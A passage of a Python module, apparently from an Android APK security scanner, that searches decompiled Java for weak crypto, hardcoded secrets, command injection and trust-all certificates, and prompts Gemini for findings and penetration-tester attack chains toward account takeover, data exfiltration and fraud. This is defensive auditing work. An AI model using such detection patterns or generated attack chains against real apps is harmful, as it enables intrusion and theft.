    results["statistics"]["max_depth"] = _calculate_max_call_depth(results["methods"])
    results["statistics"]["cyclomatic_complexity"] = _estimate_cyclomatic_complexity(source_code)
    
    return results


def _parse_parameters(params_str: str) -> List[Dict[str, str]]:
    """Parse method parameters from string."""
    if not params_str.strip():
        return []
    
    params = []
    # Split by comma, but handle generics
    depth = 0
    current = ""
    
    for char in params_str:
        if char == '<':
            depth += 1
        elif char == '>':
            depth -= 1
        elif char == ',' and depth == 0:
            if current.strip():
                params.append(_parse_single_param(current.strip()))
            current = ""
            continue
        current += char
    
    if current.strip():
        params.append(_parse_single_param(current.strip()))
    
    return params


def _parse_single_param(param_str: str) -> Dict[str, str]:
    """Parse a single parameter."""
    parts = param_str.split()
    if len(parts) >= 2:
        return {"type": ' '.join(parts[:-1]), "name": parts[-1]}
    elif len(parts) == 1:
        return {"type": parts[0], "name": ""}
    return {"type": "unknown", "name": ""}


def _extract_modifiers(line: str) -> List[str]:
    """Extract method modifiers from line."""
    modifiers = []
    modifier_keywords = ["public", "private", "protected", "static", "final", 
                        "native", "synchronized", "abstract"]
    for mod in modifier_keywords:
        if re.search(rf'\b{mod}\b', line):
            modifiers.append(mod)
    return modifiers


def _extract_method_calls(code: str, current_class: str) -> List[Dict[str, Any]]:
    """Extract method calls from code block."""
    calls = []
    lines = code.split('\n')
    
    # Method call patterns
    # this.method() or method()
    internal_call = re.compile(r'(?:this\.)?(\w+)\s*\(')
    # object.method()
    object_call = re.compile(r'(\w+)\.(\w+)\s*\(')
    # Class.staticMethod()
    static_call = re.compile(r'([A-Z]\w+)\.(\w+)\s*\(')
    # new Constructor()
    constructor_call = re.compile(r'new\s+(\w+)\s*\(')
    # super.method()
    super_call = re.compile(r'super\.(\w+)\s*\(')
    
    for line_num, line in enumerate(lines, 1):
        # Skip comments
        if line.strip().startswith('//') or line.strip().startswith('*'):
            continue
        
        # Constructor calls
        for match in constructor_call.finditer(line):
            calls.append({
                "method": f"<init>",
                "class": match.group(1),
                "line": line_num,
                "type": "constructor"
            })
        
        # Static method calls
        for match in static_call.finditer(line):
            class_name = match.group(1)
            method_name = match.group(2)
            # Skip common non-method patterns
            if method_name not in ['class', 'this']:
                calls.append({
                    "method": method_name,
                    "class": class_name,
                    "line": line_num,
                    "type": "static"
                })
        
        # Object method calls (excluding static ones already captured)
        for match in object_call.finditer(line):
            obj_name = match.group(1)
            method_name = match.group(2)
            # Skip if it's a static call we already captured
            if not obj_name[0].isupper():
                calls.append({
                    "method": method_name,
                    "class": obj_name,
                    "line": line_num,
                    "type": "instance"
                })
        
        # Super calls
        for match in super_call.finditer(line):
            calls.append({
                "method": match.group(1),
                "class": "super",
                "line": line_num,
                "type": "super"
            })
    
    return calls


def _get_entry_point_type(method_name: str) -> str:
    """Get the type of entry point based on method name."""
    activity_methods = {"onCreate", "onStart", "onResume", "onPause", "onStop", 
                       "onDestroy", "onNewIntent", "onActivityResult"}
    fragment_methods = {"onCreateView", "onViewCreated", "onAttach", "onDetach"}
    service_methods = {"onBind", "onStartCommand", "onHandleIntent"}
    receiver_methods = {"onReceive"}
    provider_methods = {"query", "insert", "update", "delete", "getType"}
    ui_methods = {"onClick", "onLongClick", "onTouch", "onItemClick"}
    thread_methods = {"run", "call", "doInBackground"}
    
    if method_name in activity_methods:
        return "activity_lifecycle"
    elif method_name in fragment_methods:
        return "fragment_lifecycle"
    elif method_name in service_methods:
        return "service_lifecycle"
    elif method_name in receiver_methods:
        return "broadcast_receiver"
    elif method_name in provider_methods:
        return "content_provider"
    elif method_name in ui_methods:
        return "ui_callback"
    elif method_name in thread_methods:
        return "async_task"
    else:
        return "other"


def _calculate_max_call_depth(methods: List[Dict]) -> int:
    """Calculate the maximum call depth in the call graph."""
    # Build adjacency list
    adjacency = {}
    for method in methods:
        adjacency[method["name"]] = [c["method"] for c in method["calls"]]
    
    def dfs_depth(node: str, visited: set) -> int:
        if node in visited or node not in adjacency:
            return 0
        visited.add(node)
        max_child = 0
        for child in adjacency.get(node, []):
            max_child = max(max_child, dfs_depth(child, visited.copy()))
        return 1 + max_child
    
    max_depth = 0
    for method in methods:
        if method["is_entry_point"]:
            depth = dfs_depth(method["name"], set())
            max_depth = max(max_depth, depth)
    
    return max_depth


def _estimate_cyclomatic_complexity(source_code: str) -> int:
    """Estimate cyclomatic complexity of the code."""
    complexity = 1  # Base complexity
    
    # Decision points
    decision_patterns = [
        r'\bif\s*\(',
        r'\belse\s+if\s*\(',
        r'\bfor\s*\(',
        r'\bwhile\s*\(',
        r'\bcase\s+',
        r'\bcatch\s*\(',
        r'\?\s*.*\s*:',  # Ternary operator
        r'\&\&',
        r'\|\|',
    ]
    
    for pattern in decision_patterns:
        complexity += len(re.findall(pattern, source_code))
    
    return complexity


# ============================================================================
# Smart Search - Semantic Code Search
# ============================================================================

# Security-related keywords and their synonyms/related terms
SECURITY_KEYWORD_EXPANSIONS = {
    "password": ["password", "passwd", "pwd", "secret", "credential", "auth", "login"],
    "crypto": ["encrypt", "decrypt", "cipher", "aes", "rsa", "des", "hash", "md5", "sha", "crypto"],
    "network": ["http", "https", "url", "socket", "connection", "request", "response", "api", "endpoint"],
    "storage": ["file", "database", "sqlite", "sharedpreferences", "cache", "store", "save", "write", "read"],
    "auth": ["authentication", "authorization", "login", "logout", "session", "token", "jwt", "oauth", "sso"],
    "injection": ["sql", "query", "execute", "command", "shell", "runtime", "exec", "eval"],
    "sensitive": ["private", "secret", "key", "api_key", "apikey", "token", "credential", "ssn", "credit"],
    "webview": ["webview", "javascript", "loadurl", "addjavascriptinterface", "evaluatejavascript"],
    "intent": ["intent", "broadcast", "startactivity", "startservice", "bindservice", "pendingintent"],
    "permission": ["permission", "checkpermission", "requestpermission", "granted", "denied"],
}

# Vulnerability patterns with descriptions
SMART_SEARCH_VULN_PATTERNS = {
    "hardcoded_secret": {
        "patterns": [
            r'(?:password|passwd|pwd|secret|key|token|api[_-]?key)\s*=\s*["\'][^"\']{4,}["\']',
            r'private\s+(?:static\s+)?(?:final\s+)?String\s+\w*(?:KEY|SECRET|PASSWORD|TOKEN)\w*\s*=',
        ],
        "description": "Hardcoded secrets or credentials",
        "severity": "high"
    },
    "sql_injection": {
        "patterns": [
            r'rawQuery\s*\([^)]*\+',
            r'execSQL\s*\([^)]*\+',
            r'query\s*\([^)]*\+\s*\w+',
        ],
        "description": "Potential SQL injection vulnerability",
        "severity": "critical"
    },
    "insecure_random": {
        "patterns": [
            r'new\s+Random\s*\(',
            r'Math\.random\s*\(',
        ],
        "description": "Insecure random number generation",
        "severity": "medium"
    },
    "weak_crypto": {
        "patterns": [
            r'DES[/"\'.]',
            r'MD5',
            r'SHA-?1[^0-9]',
            r'ECB',
            r'RC4',
        ],
        "description": "Weak cryptographic algorithm",
        "severity": "high"
    },
    "insecure_network": {
        "patterns": [
            r'http://[^"\']*(?!localhost)',
            r'setHostnameVerifier\s*\(\s*.*ALLOW_ALL',
            r'trustAllCerts',
            r'X509TrustManager.*checkServerTrusted.*\{\s*\}',
        ],
        "description": "Insecure network communication",
        "severity": "high"
    },
    "exported_component": {
        "patterns": [
            r'android:exported\s*=\s*["\']true["\']',
        ],
        "description": "Exported Android component",
        "severity": "medium"
    },
    "webview_risk": {
        "patterns": [
            r'setJavaScriptEnabled\s*\(\s*true\s*\)',
            r'addJavascriptInterface\s*\(',
            r'setAllowFileAccess\s*\(\s*true\s*\)',
        ],
        "description": "Potentially risky WebView configuration",
        "severity": "medium"
    },
    "logging_sensitive": {
        "patterns": [
            r'Log\.[dviwe]\s*\([^)]*(?:password|secret|key|token|credential)',
        ],
        "description": "Sensitive data in logs",
        "severity": "high"
    },
}


def smart_search(output_dir: Path, query: str, search_type: str = "smart", max_results: int = 100) -> Dict[str, Any]:
    """
    Perform smart/semantic search across decompiled sources.
    
    Search types:
    - "smart": Expands query with related security terms
    - "vuln": Searches for vulnerability patterns
    - "regex": Direct regex search
    - "exact": Exact string match
    """
    results = {
        "query": query,
        "search_type": search_type,
        "total_matches": 0,
        "files_searched": 0,
        "matches": [],
        "vulnerability_summary": {},
        "suggestions": []
    }
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return results
    
    # Build search patterns based on type
    search_patterns = []
    
    if search_type == "smart":
        # Expand query with related terms
        query_lower = query.lower()
        expanded_terms = [query]
        
        for key, synonyms in SECURITY_KEYWORD_EXPANSIONS.items():
            if key in query_lower or any(s in query_lower for s in synonyms):
                expanded_terms.extend(synonyms)
        
        # Remove duplicates and create patterns
        expanded_terms = list(set(expanded_terms))
        search_patterns = [re.compile(rf'\b{re.escape(term)}\b', re.IGNORECASE) for term in expanded_terms]
        results["expanded_terms"] = expanded_terms
        
    elif search_type == "vuln":
        # Search for vulnerability patterns
        vuln_results = {}
        for vuln_name, vuln_info in SMART_SEARCH_VULN_PATTERNS.items():
            if query.lower() in vuln_name or query.lower() == "all":
                for pattern in vuln_info["patterns"]:
                    search_patterns.append((
                        re.compile(pattern, re.IGNORECASE),
                        vuln_name,
                        vuln_info["description"],
                        vuln_info["severity"]
                    ))
        
    elif search_type == "regex":
        try:
            search_patterns = [re.compile(query, re.IGNORECASE)]
        except re.error:
            results["error"] = "Invalid regex pattern"
            return results
            
    else:  # exact
        search_patterns = [re.compile(re.escape(query), re.IGNORECASE)]
    
    # Search through all Java files
    for java_file in sources_dir.rglob("*.java"):
        if len(results["matches"]) >= max_results:
            break
            
        results["files_searched"] += 1
        
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(java_file.relative_to(sources_dir))
            
            for line_num, line in enumerate(lines, 1):
                if len(results["matches"]) >= max_results:
                    break
                    
                for pattern_item in search_patterns:
                    # Handle vuln search with extra info
                    if search_type == "vuln" and isinstance(pattern_item, tuple):
                        pattern, vuln_name, description, severity = pattern_item
                        match = pattern.search(line)
                        if match:
                            results["matches"].append({
                                "file": rel_path,
                                "line": line_num,
                                "code": line.strip(),
                                "match": match.group(),
                                "vuln_type": vuln_name,
                                "description": description,
                                "severity": severity
                            })
                            results["total_matches"] += 1
                            
                            # Track vulnerability summary
                            if vuln_name not in results["vulnerability_summary"]:
                                results["vulnerability_summary"][vuln_name] = {
                                    "count": 0,
                                    "severity": severity,
                                    "description": description
                                }
                            results["vulnerability_summary"][vuln_name]["count"] += 1
                    else:
                        # Regular search
                        pattern = pattern_item
                        match = pattern.search(line)
                        if match:
                            # Get context lines
                            context_start = max(0, line_num - 3)
                            context_end = min(len(lines), line_num + 2)
                            context = '\n'.join(lines[context_start:context_end])
                            
                            results["matches"].append({
                                "file": rel_path,
                                "line": line_num,
                                "code": line.strip(),
                                "match": match.group(),
                                "context": context
                            })
                            results["total_matches"] += 1
                            break  # Don't duplicate matches on same line
                            
        except Exception as e:
            logger.warning(f"Error searching file {java_file}: {e}")
    
    # Add search suggestions
    if results["total_matches"] == 0:
        results["suggestions"] = [
            "Try using 'smart' search type to expand your query",
            "Use 'vuln' search type to find security vulnerabilities",
            "Check if the search term exists in the codebase"
        ]
    
    return results


# ============================================================================
# AI Vulnerability Scan - Comprehensive Cross-Class Analysis
# ============================================================================

def _rank_classes_by_security_relevance(sources_dir: Path) -> List[Dict[str, Any]]:
    """
    Rank ALL classes in the codebase by security relevance.
    Returns a sorted list with the most security-relevant classes first.
    """
    all_java_files = list(sources_dir.rglob("*.java"))
    ranked_classes = []
    
    # Security relevance scoring rules
    scoring_rules = [
        # High priority - authentication & authorization
        (r"(?i)login|auth|signin|signup|credential|session|token|oauth|jwt", 100, "auth"),
        (r"(?i)password|passwd|secret|apikey|api_key|private_key", 90, "secrets"),
        # High priority - cryptography
        (r"(?i)crypto|cipher|encrypt|decrypt|aes|rsa|des|hash|digest|hmac", 85, "crypto"),
        (r"(?i)keystore|keychain|certificate|ssl|tls|pinning", 80, "crypto"),
        # High priority - network & data transmission
        (r"(?i)http|https|url|request|response|retrofit|okhttp|volley|websocket", 75, "network"),
        (r"(?i)api|endpoint|rest|graphql|socket", 70, "network"),
        # High priority - data storage & persistence
        (r"(?i)database|sqlite|room|realm|preference|sharedpref|datastore", 70, "storage"),
        (r"(?i)file|stream|read|write|external|internal|cache", 60, "storage"),
        # Medium priority - Android components
        (r"Activity\.java$", 55, "activity"),
        (r"Fragment\.java$", 50, "fragment"),
        (r"Service\.java$", 65, "service"),
        (r"(?i)broadcast|receiver", 60, "receiver"),
        (r"(?i)provider|content", 60, "provider"),
        # Medium priority - sensitive data handling
        (r"(?i)payment|billing|purchase|credit|card|stripe|paypal", 80, "payment"),
        (r"(?i)location|gps|geo|latitude|longitude", 55, "location"),
        (r"(?i)camera|photo|image|media|video|record", 50, "media"),
        (r"(?i)contact|phone|sms|call|telephony", 55, "pii"),
        (r"(?i)user|profile|account|email|name|address", 50, "pii"),
        # Medium priority - WebView & JavaScript
        (r"(?i)webview|javascript|addjavascript|evaluatejavascript", 70, "webview"),
        # Lower priority but still relevant
        (r"(?i)intent|bundle|extra|parcel", 40, "ipc"),
        (r"(?i)permission|grant|request", 45, "permissions"),
        (r"(?i)log|debug|trace|print", 35, "logging"),
        (r"(?i)exception|error|catch|throw", 30, "error_handling"),
        # Analytics & tracking
        (r"(?i)firebase|analytics|tracking|metric|telemetry", 45, "analytics"),
        (r"(?i)crashlytics|bugsnag|sentry", 40, "analytics"),
    ]
    
    for java_file in all_java_files:
        try:
            rel_path = str(java_file.relative_to(sources_dir))
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            file_size = len(content)
            
            # Skip very small files (likely stubs) or very large files (likely generated)
            if file_size < 200 or file_size > 100000:
                continue
            
            # Calculate security score
            score = 0
            categories = set()
            
            # Check filename and content
            check_text = rel_path + "\n" + content[:5000]  # Check start of file
            
            for pattern, points, category in scoring_rules:
                if re.search(pattern, check_text):
                    score += points
                    categories.add(category)
            
            # Boost score for classes with multiple security-relevant patterns
            if len(categories) >= 3:
                score *= 1.5
            elif len(categories) >= 2:
                score *= 1.2
            
            # Check for specific dangerous patterns that warrant higher priority
            dangerous_patterns = [
                (r'Runtime\.getRuntime\(\)\.exec', 50, "command_injection"),
                (r'\.executeQuery\s*\(\s*["\'].*\+', 50, "sql_injection"),
                (r'new\s+URL\s*\(\s*["\']http:', 40, "insecure_http"),
                (r'setJavaScriptEnabled\s*\(\s*true', 40, "js_enabled"),
                (r'TrustManager.*AllTrust|X509TrustManager.*null', 60, "ssl_bypass"),
                (r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE', 45, "world_perms"),
                (r'addJavascriptInterface', 50, "js_interface"),
                (r'android:exported="true"', 35, "exported_component"),
                (r'Log\.[dievw]\s*\(.*password|Log\.[dievw]\s*\(.*token', 40, "sensitive_logging"),
            ]
            
            for pattern, points, category in dangerous_patterns:
                if re.search(pattern, content):
                    score += points
                    categories.add(category)
            
            if score > 0:
                ranked_classes.append({
                    "path": rel_path,
                    "score": score,
                    "categories": list(categories),
                    "size": file_size,
                    "content": content
                })
                
        except Exception as e:
            logger.debug(f"Error processing {java_file}: {e}")
    
    # Sort by score (highest first)
    ranked_classes.sort(key=lambda x: x["score"], reverse=True)
    
    return ranked_classes


async def _analyze_code_chunk_with_ai(
    client,
    classes: List[Dict[str, Any]],
    chunk_num: int,
    total_chunks: int,
    scan_type: str
) -> Dict[str, Any]:
    """
    Analyze a chunk of classes with AI and return structured findings.
    """
    from google.genai import types
    
    # Build code context for this chunk
    code_context = "\n\n".join([
        f"// === FILE: {c['path']} (Security Score: {c['score']}, Categories: {', '.join(c['categories'])}) ===\n{c['content'][:15000]}"
        for c in classes
    ])
    
    prompt = f"""You are an expert Android security auditor performing a THOROUGH code review. This is chunk {chunk_num}/{total_chunks} of the codebase analysis.

SCAN TYPE: {scan_type}
CLASSES IN THIS CHUNK: {len(classes)}
SECURITY-RELEVANT CATEGORIES: {', '.join(set(cat for c in classes for cat in c['categories']))}

Analyze EVERY class provided and return a JSON response:
{{
    "vulnerabilities": [
        {{
            "id": "VULN-{chunk_num}-NNN",
            "title": "Clear vulnerability title",
            "severity": "critical|high|medium|low",
            "category": "Category (Authentication, Cryptography, Data Storage, Network, IPC, etc.)",
            "affected_class": "path/to/ClassName.java",
            "affected_method": "methodName() or null",
            "line_number": 123,
            "description": "Detailed description of the vulnerability",
            "code_snippet": "The exact vulnerable code line(s)",
            "impact": "What an attacker could achieve",
            "exploitation": "How this could be exploited",
            "remediation": "Specific code fix recommendation",
            "cwe_id": "CWE-XXX",
            "confidence": "confirmed|likely|possible",
            "cross_class_risk": true/false,
            "data_flow_risk": "description of any data flow concern or null"
        }}
    ],
    "cross_class_observations": [
        "Observation about how classes interact in potentially insecure ways"
    ],
    "data_flows": [
        {{
            "source_class": "Source.java",
            "sink_class": "Sink.java", 
            "data_type": "credentials|tokens|pii|etc",
            "risk_description": "Why this flow is risky"
        }}
    ]
}}

## CRITICAL VULNERABILITIES TO CHECK:
1. **Hardcoded Secrets**: API keys, passwords, tokens, crypto keys, private keys in code
2. **Insecure Crypto**: MD5/SHA1 for passwords, ECB mode, hardcoded IVs, weak key derivation
3. **SQL Injection**: Raw queries with string concatenation, no parameterization
4. **Command Injection**: Runtime.exec() with user input
5. **Path Traversal**: File ops with unvalidated user input
6. **Insecure Network**: HTTP URLs for sensitive data, disabled SSL verification
7. **WebView Risks**: JavaScript enabled + addJavascriptInterface, file:// access
8. **Exported Components**: Unprotected activities/services/providers/receivers
9. **Insecure Storage**: Cleartext SharedPreferences, MODE_WORLD_READABLE
10. **Logging Sensitive Data**: Passwords, tokens, PII in logs
11. **Intent Spoofing**: Implicit intents with sensitive data
12. **Clipboard Exposure**: Sensitive data copied to clipboard
13. **Backup Vulnerabilities**: allowBackup=true with sensitive local data
14. **Root Detection Bypass**: Weak or bypassable root detection
15. **Certificate Pinning Issues**: No pinning, or easily bypassed pinning

## SEVERITY GUIDELINES:
- **CRITICAL**: RCE, auth bypass, exposed production secrets, full data access
- **HIGH**: SQL/command injection, disabled SSL, hardcoded crypto keys, exported sensitive components
- **MEDIUM**: Information disclosure, weak crypto, insecure storage, logging sensitive data
- **LOW**: Debug features, minor misconfigs, code quality

Analyze ALL classes. Report ALL vulnerabilities found. Be thorough but avoid false positives.

CODE TO ANALYZE:
{code_context}"""

    try:
        # Use retry helper for reliability
        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            operation_name=f"AI chunk {chunk_num}/{total_chunks} analysis"
        )
        
        if response is None:
            logger.error(f"AI chunk {chunk_num} analysis failed after retries")
            return {"vulnerabilities": [], "error": "All retry attempts failed"}
        
        response_text = response.text
        
        # Extract JSON from response
        json_match = re.search(r'\{[\s\S]*\}', response_text)
        if json_match:
            return json.loads(json_match.group())
        else:
            return {"vulnerabilities": [], "cross_class_observations": [], "data_flows": []}
            
    except Exception as e:
        logger.error(f"AI chunk analysis failed: {e}")
        return {"vulnerabilities": [], "error": str(e)}


async def ai_vulnerability_scan(
    output_dir: Path,
    scan_type: str = "quick",
    focus_areas: List[str] = None
) -> Dict[str, Any]:
    """
    Perform comprehensive AI-powered vulnerability scan across the ENTIRE codebase.
    
    Uses a multi-phase approach:
    1. Index and rank ALL classes by security relevance
    2. Analyze in chunks (multiple AI calls for deep coverage)
    3. Synthesize cross-class vulnerabilities
    
    Scan types:
    - "quick": Top 50 security-relevant classes, 2 chunks
    - "deep": Top 150 classes, 6 chunks  
    - "focused": Filter by focus_areas, 3 chunks
    """
    from google import genai
    from google.genai import types
    
    if not settings.gemini_api_key:
        return {
            "error": "AI features require Gemini API key",
            "scan_type": scan_type,
            "vulnerabilities": [],
            "summary": "AI scan unavailable"
        }
    
    client = genai.Client(api_key=settings.gemini_api_key)
    
    results = {
        "scan_type": scan_type,
        "focus_areas": focus_areas or [],
        "total_classes_in_apk": 0,
        "classes_indexed": 0,
        "classes_scanned": 0,
        "vulnerabilities": [],
        "risk_summary": {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0
        },
        "attack_chains": [],
        "cross_class_observations": [],
        "data_flows": [],
        "recommendations": [],
        "summary": ""
    }
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        results["error"] = "No decompiled sources found"
        return results
    
    # Phase 1: Index and rank ALL classes
    logger.info("AI vulnerability scan: Indexing and ranking all classes...")
    all_java_files = list(sources_dir.rglob("*.java"))
    results["total_classes_in_apk"] = len(all_java_files)
    
    ranked_classes = _rank_classes_by_security_relevance(sources_dir)
    results["classes_indexed"] = len(ranked_classes)
    
    if not ranked_classes:
        results["summary"] = "No analyzable classes found"
        return results
    
    # Phase 2: Determine how many classes to scan based on scan type
    # BALANCED: Enough coverage while staying fast for large APKs
    if scan_type == "quick":
        max_classes = 50   # Good coverage of security-relevant classes
        chunk_size = 25    # 2 chunks for quick mode
    elif scan_type == "deep":
        max_classes = 120  # Thorough coverage
        chunk_size = 30    # 4 chunks for deep mode
    else:  # focused
        max_classes = 60   # Focused but thorough
        chunk_size = 30
    
    # Filter by focus areas if specified
    if focus_areas:
        filtered_classes = [c for c in ranked_classes if any(fa in c["categories"] for fa in focus_areas)]
        if filtered_classes:
            ranked_classes = filtered_classes
    
    # Take top N classes
    classes_to_scan = ranked_classes[:max_classes]
    results["classes_scanned"] = len(classes_to_scan)
    
    logger.info(f"AI vulnerability scan: Analyzing {len(classes_to_scan)} classes in chunks of {chunk_size}")
    
    # Phase 3: Analyze in chunks
    all_vulnerabilities = []
    all_observations = []
    all_data_flows = []
    
    chunks = [classes_to_scan[i:i + chunk_size] for i in range(0, len(classes_to_scan), chunk_size)]
    total_chunks = len(chunks)
    
    # Limit to max 4 chunks to reduce API calls while maintaining coverage
    if total_chunks > 4:
        logger.info(f"AI vulnerability scan: Limiting to 4 chunks (was {total_chunks})")
        chunks = chunks[:4]
        total_chunks = 4
    
    for idx, chunk in enumerate(chunks):
        logger.info(f"AI vulnerability scan: Analyzing chunk {idx + 1}/{total_chunks} ({len(chunk)} classes)")
        
        chunk_result = await _analyze_code_chunk_with_ai(
            client, chunk, idx + 1, total_chunks, scan_type
        )
        
        all_vulnerabilities.extend(chunk_result.get("vulnerabilities", []))
        all_observations.extend(chunk_result.get("cross_class_observations", []))
        all_data_flows.extend(chunk_result.get("data_flows", []))
    
    results["vulnerabilities"] = all_vulnerabilities
    results["cross_class_observations"] = all_observations
    results["data_flows"] = all_data_flows
    
    # Calculate risk summary
    for vuln in all_vulnerabilities:
        severity = vuln.get("severity", "medium").lower()
        if severity in results["risk_summary"]:
            results["risk_summary"][severity] += 1
    
    # Phase 4: Generate attack chains from cross-class data
    # OPTIMIZED: Only run if we have substantial findings
    if len(all_vulnerabilities) >= 3:
        logger.info("AI vulnerability scan: Generating attack chains...")
        try:
            attack_chains = await _synthesize_attack_chains(client, all_vulnerabilities, all_data_flows)
            results["attack_chains"] = attack_chains
        except Exception as e:
            logger.warning(f"Attack chain synthesis failed: {e}")
    
    # Generate recommendations
    if results["risk_summary"]["critical"] > 0:
        results["recommendations"].append("URGENT: Address critical vulnerabilities immediately before any release")
    if results["risk_summary"]["high"] > 0:
        results["recommendations"].append("HIGH PRIORITY: Fix high-severity issues in the current sprint")
    if any("crypto" in v.get("category", "").lower() for v in all_vulnerabilities):
        results["recommendations"].append("Review and modernize all cryptographic implementations")
    if any("ssl" in v.get("title", "").lower() or "certificate" in v.get("title", "").lower() for v in all_vulnerabilities):
        results["recommendations"].append("Implement proper SSL/TLS certificate pinning")
    if any("storage" in v.get("category", "").lower() for v in all_vulnerabilities):
        results["recommendations"].append("Encrypt sensitive data at rest using Android Keystore")
    if any("logging" in v.get("category", "").lower() or "log" in v.get("title", "").lower() for v in all_vulnerabilities):
        results["recommendations"].append("Remove or redact all sensitive data from logs before release")
    
    # Generate summary
    total_vulns = len(all_vulnerabilities)
    critical_high = results["risk_summary"]["critical"] + results["risk_summary"]["high"]
    
    results["summary"] = (
        f"Comprehensive security scan analyzed {results['classes_scanned']} security-relevant classes "
        f"(out of {results['total_classes_in_apk']} total). Found {total_vulns} potential vulnerabilities: "
        f"{results['risk_summary']['critical']} critical, {results['risk_summary']['high']} high, "
        f"{results['risk_summary']['medium']} medium, {results['risk_summary']['low']} low severity. "
        f"Identified {len(all_observations)} cross-class security patterns and {len(all_data_flows)} risky data flows."
    )
    
    return results


async def _synthesize_attack_chains(
    client,
    vulnerabilities: List[Dict[str, Any]],
    data_flows: List[Dict[str, Any]]
) -> List[Dict[str, Any]]:
    """
    Use AI to synthesize attack chains from individual vulnerabilities.
    """
    from google.genai import types
    
    # Prepare vulnerability summary for synthesis
    vuln_summary = json.dumps([
        {
            "id": v.get("id"),
            "title": v.get("title"),
            "severity": v.get("severity"),
            "category": v.get("category"),
            "affected_class": v.get("affected_class"),
            "description": v.get("description")[:200] if v.get("description") else ""
        }
        for v in vulnerabilities[:30]  # Limit for token count
    ], indent=2)
    
    data_flow_summary = json.dumps(data_flows[:15], indent=2) if data_flows else "[]"
    
    prompt = f"""As a penetration tester, analyze these vulnerabilities and data flows to identify multi-step attack chains that an attacker could use.

VULNERABILITIES FOUND:
{vuln_summary}

DATA FLOWS IDENTIFIED:
{data_flow_summary}

Generate realistic attack chains that combine multiple vulnerabilities. Return JSON:
{{
    "attack_chains": [
        {{
            "name": "Attack chain name",
            "severity": "critical|high|medium",
            "steps": [
                "Step 1: [Initial access/entry point]",
                "Step 2: [Escalation/pivot]",
                "Step 3: [Final objective]"
            ],
            "vulnerabilities_used": ["VULN-ID-1", "VULN-ID-2"],
            "impact": "What attacker achieves (e.g., account takeover, data theft)",
            "likelihood": "high|medium|low",
            "prerequisites": "What attacker needs (e.g., network access, local app)"
        }}
    ]
}}

Focus on realistic, exploitable chains. Prioritize chains leading to:
1. Authentication bypass / account takeover
2. Sensitive data exfiltration
3. Remote code execution
4. Financial fraud"""

    try:
        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=120.0,
            operation_name="Attack chain synthesis"
        )
        
        if response is not None:
            json_match = re.search(r'\{[\s\S]*\}', response.text)
            if json_match:
                result = json.loads(json_match.group())
                return result.get("attack_chains", [])
    except Exception as e:
        logger.error(f"Attack chain synthesis failed: {e}")
    
    return []


# Legacy code_context building for backwards compatibility


def _add_to_source_tree(tree: Dict, path: str) -> None:
    """Add a file path to the source tree structure."""
    parts = path.split('/')
    current = tree
    for i, part in enumerate(parts):
        if i == len(parts) - 1:
            # File
            if 'files' not in current:
                current['files'] = []
            current['files'].append(part)
        else:
            # Directory
            if part not in current:
                current[part] = {}
            current = current[part]


def get_jadx_class_source(output_dir: Path, class_path: str) -> Optional[str]:
    """Get the source code for a specific class from JADX output."""
    source_file = output_dir / "sources" / class_path
    if source_file.exists():
        return source_file.read_text(encoding='utf-8', errors='ignore')
    return None


def get_jadx_result_summary(output_dir: Path) -> Dict[str, Any]:
    """
    Get a summary of JADX decompilation results for AI diagram generation.
    
    Args:
        output_dir: Path to JADX output directory
        
    Returns:
        Dict with package_name, classes, source_tree, and sample code
    """
    sources_dir = output_dir / "sources"
    
    summary = {
        'package_name': 'unknown',
        'classes': [],
        'source_tree': {},
        'sample_code': [],  # Sample source code for AI context
    }
    
    if not sources_dir.exists():
        return summary
    
    # Find all Java files and categorize them
    java_files = list(sources_dir.rglob("*.java"))
    
    # Infer package name from directory structure
    if java_files:
        first_file = java_files[0]
        relative_path = first_file.relative_to(sources_dir)
        if len(relative_path.parts) >= 2:
            # Take first two package parts
            summary['package_name'] = '.'.join(relative_path.parts[:2])
    
    # Process classes (limit to first 200 for performance)
    for java_file in java_files[:200]:
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')[:5000]  # First 5KB
            class_name = java_file.stem
            relative_path = str(java_file.relative_to(sources_dir))
            
            # Detect component type
            is_activity = 'extends Activity' in content or 'extends AppCompatActivity' in content or 'extends FragmentActivity' in content
            is_service = 'extends Service' in content or 'extends IntentService' in content
            is_receiver = 'extends BroadcastReceiver' in content
            is_provider = 'extends ContentProvider' in content
            
            # Extract package and extends info
            package_match = re.search(r'package\s+([\w.]+);', content)
            extends_match = re.search(r'class\s+\w+\s+extends\s+(\w+)', content)
            
            class_info = {
                'class_name': class_name,
                'package_name': package_match.group(1) if package_match else 'unknown',
                'file_path': relative_path,
                'is_activity': is_activity,
                'is_service': is_service,
                'is_receiver': is_receiver,
                'is_provider': is_provider,
                'extends': extends_match.group(1) if extends_match else None,
                'line_count': content.count('\n')
            }
            
            summary['classes'].append(class_info)
            
            # Collect sample code for main components (for AI context)
            if (is_activity or is_service or is_receiver or is_provider) and len(summary['sample_code']) < 10:
                summary['sample_code'].append({
                    'class_name': class_name,
                    'type': 'activity' if is_activity else 'service' if is_service else 'receiver' if is_receiver else 'provider',
                    'code_snippet': content[:3000]  # First 3KB
                })
                
        except Exception:
            continue
    
    return summary


def search_jadx_sources(output_dir: Path, query: str, max_results: int = 50) -> List[Dict[str, Any]]:
    """Search for a string in JADX decompiled sources."""
    import re
    
    results = []
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return results
    
    pattern = re.compile(re.escape(query), re.IGNORECASE)
    
    for java_file in sources_dir.rglob("*.java"):
        if len(results) >= max_results:
            break
            
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            for i, line in enumerate(content.split('\n'), 1):
                if pattern.search(line):
                    results.append({
                        'file': str(java_file.relative_to(sources_dir)),
                        'line': i,
                        'content': line.strip()[:200],
                        'class_name': java_file.stem
                    })
                    if len(results) >= max_results:
                        break
        except Exception:
            continue
    
